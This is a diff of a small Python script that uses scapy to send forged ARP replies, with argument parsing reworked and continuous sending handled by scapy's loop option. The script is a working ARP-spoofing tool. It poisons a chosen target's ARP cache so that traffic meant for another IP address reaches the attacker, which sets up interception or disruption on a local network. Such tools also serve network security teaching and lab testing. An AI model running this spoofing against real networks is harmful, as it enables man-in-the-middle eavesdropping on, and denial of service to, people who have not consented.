@@ -1,65 +1,70 @@
 #!/usr/bin/env python3
-# Spoofing ARP reply
-# (c) volgk
+# Description: Spoof ARP reply
+# Depends on:  scapy
+#
+# (c) volgk, github.com/volgk
+# modified by Alexandr Savca, alexandr dot savca89 at gmail dot com
 
 from scapy.all import *
 
-def arp_reply_spoof(interface, target_ip, target_mac, spoof_ip):
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet, iface=interface, verbose=True)
+def arp_reply_spoof(iface, targetip, targetmac, spoofip, timeout):
+    packet = ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=spoofip)
+    send(packet, iface=iface, loop=True, inter=timeout, verbose=True)
 
-def exit_error (msg):
-    import sys
-    
-    print (f"Error: {msg}", file=sys.stderr)
-    parser.print_help(sys.stderr)
-    sys.exit(1)
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     import argparse
     import time
 
-    interface = get_working_if()
+    iface = get_working_if()
 
-    parser = argparse.ArgumentParser (add_help=True, description="Spoof ARP reply")
-    parser.add_argument ('--iface',      help=f"interface name. Default: {interface}")
-    parser.add_argument ('--target_ip',  help="target IP address")
-    parser.add_argument ('--target_mac', help="target MAC address")
-    parser.add_argument ('--spoof_ip',   help="spoof IP address")
-    parser.add_argument ('--timeout',    help="timeout between sending spoof packets")
+    parser = argparse.ArgumentParser(add_help=True,
+            description="Spoof ARP reply")
+
+    parser.add_argument("-i", "--iface",
+            action="store",
+            dest="iface",
+            help=f"interface name (default is {iface}")
+
+    parser.add_argument("-ti", "--targetip",
+            action="store",
+            required=True,
+            dest="targetip",
+            help="target IP address")
+
+    parser.add_argument("-tmac", "--targetmac",
+            action="store",
+            dest="targetmac",
+            help="target MAC address (default is targetip's address)")
+
+    parser.add_argument("-si", "--spoofip",
+            action="store",
+            dest="spoofip",
+            required=True,
+            help="spoof IP address")
+
+    parser.add_argument("-T", "--timeout", action="store",
+            dest="timeout",
+            default=0,
+            type=int,
+            help="timeout between sending spoof packets (default is 0)")
 
     args = parser.parse_args()
 
     if args.iface:
-        interface = args.iface
+        iface = args.iface
 
-    if args.target_ip:
-        target_ip = args.target_ip
+    if args.targetmac:
+        targetmac = args.targetmac
     else:
-        exit_error ("target IP address must be specified.")
-
-    if args.target_mac:
-        target_mac = args.target_mac
-    else:
-        target_mac = getmacbyip(target_ip)
-
-    if args.spoof_ip:
-        spoof_ip = args.spoof_ip
-    else:
-        exit_error ("spoof IP address must be specified.")
-
-    if args.timeout:
-        timeout = int (args.timeout)
-    else:
-        timeout = 0
+        targetmac = getmacbyip(args.targetip)
 
     if os.getuid() != 0:
-        print ("Must be superuser.")
+        print("Must be superuser.")
         sys.exit(1)
 
-    while 1:
-        arp_reply_spoof (interface, target_ip, target_mac, spoof_ip)
-        time.sleep(timeout)
+    arp_reply_spoof(iface, args.targetip, targetmac, args.spoofip,
+            args.timeout)
 
-# vim:sw=4:ts=4:sts=4:et:cc=80
-# End of file
+
+# vim:sw=4:ts=4:sts=4:et:tw=71:cc=72
+# End of file.
